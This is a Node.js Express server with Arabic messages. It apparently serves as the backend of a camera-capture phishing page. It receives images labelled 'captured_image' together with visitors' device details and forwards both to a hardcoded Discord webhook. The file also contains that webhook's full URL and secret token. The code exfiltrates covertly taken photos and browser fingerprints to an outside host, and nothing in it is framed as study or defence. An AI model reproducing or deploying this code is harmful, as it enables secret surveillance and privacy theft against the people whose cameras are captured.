const express = require('express');
const multer = require('multer');
const path = require('path');
const cors = require('cors');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');

const app = express();
app.use(cors());

const PORT = process.env.PORT || 3000;
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadDir),
    filename: (req, file, cb) => cb(null, Date.now() + path.extname(file.originalname))
});
const upload = multer({ storage: storage });

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1525474576606429217/oWCYqOBzZ1srvTFOwFDoz4TEMNLNT0THY9X4jmVm1zCFELE90qOkxGST6-QQ1iN6DcHR';

app.use(express.static('.'));

app.post('/api/upload', upload.single('captured_image'), async (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'لا يوجد ملف' });

    try {
        const deviceInfo = JSON.parse(req.body.deviceInfo || '{}');
        const form = new FormData();

        const embed = {
            title: "📸 صورة جديدة تم التقاطها!",
            fields: [
                { name: "📱 الجهاز/المتصفح", value: deviceInfo.userAgent.substring(0, 200), inline: false },
                { name: "🖥️ دقة الشاشة", value: deviceInfo.screen, inline: true },
                { name: "🌐 اللغة", value: deviceInfo.language, inline: true }
            ],
            color: 65280
        };

        form.append('payload_json', JSON.stringify({ embeds: [embed] }));
        form.append('file', fs.createReadStream(req.file.path));

        await axios.post(DISCORD_WEBHOOK_URL, form, { headers: form.getHeaders() });

        fs.unlinkSync(req.file.path);
        res.status(200).json({ message: "تم الإرسال" });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: "خطأ في السيرفر" });
    }
});

app.listen(PORT, () => console.log(`السيرفر يعمل على بورت ${PORT}`));
